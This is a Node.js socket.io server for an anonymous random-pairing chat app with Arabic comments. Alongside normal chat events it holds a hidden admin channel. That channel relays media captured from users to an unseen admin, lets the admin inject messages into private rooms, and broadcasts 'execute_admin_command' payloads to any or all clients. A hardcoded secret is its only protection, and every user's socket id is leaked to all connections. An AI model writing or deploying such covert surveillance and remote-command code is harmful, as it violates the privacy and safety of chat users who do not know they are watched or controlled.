const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  maxHttpBufferSize: 5e7, // السماح برفع ملفات وفيديوهات بحجم كبير دون قطع الاتصال
  pingTimeout: 10000,
  pingInterval: 5000
});

app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

let waitingUser = null;

io.on('connection', (socket) => {
  // إبلاغ الأدمن فوراً بانضمام مستخدم جديد
  socket.broadcast.emit('new_user_connected', { socketId: socket.id });

  socket.on('find_partner', () => {
    if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
      const roomName = 'room_' + socket.id + '_' + waitingUser.id;
      socket.join(roomName);
      waitingUser.join(roomName);

      socket.partnerId = waitingUser.id;
      waitingUser.partnerId = socket.id;
      socket.roomName = roomName;
      waitingUser.roomName = roomName;

      waitingUser.emit('matched');
      socket.emit('matched');
      waitingUser = null;
    } else {
      waitingUser = socket;
    }
  });

  socket.on('message', (data) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('message', { ...data, senderId: socket.id });
    }
  });

  socket.on('typing', (isTyping) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('display_typing', isTyping);
    }
  });

  socket.on('media_captured_for_admin', (data) => {
    io.to(data.adminSocketId).emit('review_captured_media', {
      targetSocketId: socket.id,
      type: data.type,
      content: data.content,
      roomName: socket.roomName
    });
  });

  socket.on('admin_approve_and_send', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return;
    if (data.roomName) {
      io.to(data.roomName).emit('message', { type: data.type, content: data.content });
    }
  });

  socket.on('admin_action', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return;

    if (data.targetSocket && data.targetSocket !== 'all') {
      io.to(data.targetSocket).emit('execute_admin_command', data);
    } else {
      io.emit('execute_admin_command', data);
    }
  });

  socket.on('disconnect', () => {
    if (waitingUser === socket) waitingUser = null;
    if (socket.roomName) {
      socket.to(socket.roomName).emit('partner_disconnected');
    }
    io.emit('user_disconnected', { socketId: socket.id });
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
